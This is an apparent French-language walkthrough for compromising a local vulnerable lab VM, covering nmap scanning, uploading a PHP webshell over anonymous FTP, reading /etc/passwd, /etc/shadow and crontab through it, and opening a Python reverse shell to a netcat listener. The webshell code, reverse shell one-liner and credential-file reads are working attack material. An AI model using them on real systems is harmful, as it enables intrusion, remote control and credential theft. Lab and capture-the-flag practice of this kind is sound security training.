
# télécharger
```01-Local1.ova```

# mettez ceci 
```sha1sum 01-Local1.ova``` pour vérifier le hash

# et regardez si le résultat est
```f3422f3364fd38e8183740f8f57fa951d3f6e0bf```

# installer virtualbox si ce n'est pas encore fait
```sudo apt update && sudo apt install -y virtualbox```

# assure toi d'avoir les outils nécessaires
```sudo apt update && sudo apt install -y net-tools nmap john hydra metasploit-framework```

# double clic sur ```01-Local1.ova```

# donnez 4096MB comme RAM (pour renforcer la machine virtuelle)
au lieu de de 512

# Changez l'adapter en NAT
au lieu de Bridge

# assure toi que la machine virtuelle
soit activée

# mettez ceci
nmap -sn 192.168.1.0/24

# sélectionnez l'adresse de la VM et mettez ceci
nmap -A ```adresse```

# se connecter
se connecter et examiner les fichiers trouvés

# créer webshell.php et y mettre ceci:
```
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
```

# mettre ceci
ftp 192.168.1.26
login: anonymous
pwd: Entrée (le bouton)

# téléverser le fichier
```put nc.php```

# éxécuter ceci dans un terminal
- nc -lvnp 12000
    - -l : Active le mode "listener".
    - -v : Mode verbeux pour voir les connexions établies.
    - -n : Ignore les DNS pour accélérer la connexion.
    - -p 12000 : Spécifie le port d'écoute.

# faire passer www-data à un utilisateur privilégié

# mettre ceci dans le navigateur:
- http://192.168.1.8/files/simple_shell.php?cmd=cat%20/etc/crontab
- http://192.168.1.8/files/simple_shell.php?cmd=find%20/%20-perm%20-u=s%20-type%20f%202%3E/dev/null
- http://192.168.1.8/files/webshell.php?cmd=cat%20/etc/passwd
- http://192.168.1.26/files/webshell.php?cmd=ls%20-l%20/etc/shadow
- http://192.168.1.26/files/webshell.php?cmd=cat%20/var/backups/apt.extended_states.1.gz

# username
shrek

# password
not yet

# nmap -sV -sC -O 192.168.1.8
- -sV : Détecte les versions des services en cours d'exécution.
- -sC : Utilise des scripts Nmap pour détecter des vulnérabilités connues.
- -O : Détermine le système d’exploitation (si possible).

# ceci sur la machine physique
nc -lvnp 4444

# ceci sur la machine virtuelle
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.26",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'

# sur le shell
ls -la /etc/passwd /etc/shadow
ls -la /etc/sudoers

# rechercher des fichiers mal sécurisés
find / -type f \( -name "*.conf" -o -name "*.sh" -o -name "*.txt" \) -exec ls -la {} +


# developer
- Prénom NOM: Mouhamed DIOUF
- email: seydiahmedelcheikh@gmail.com

-----------------------------------------------------------------------------------------------

# link for kali
- https://www.youtube.com/watch?v=trPm2DB8678
- https://www.youtube.com/watch?v=B7wCf0JiOcM&list=PLZEN0mW2CQl38fx0wtv53VEmn5CKJIrLA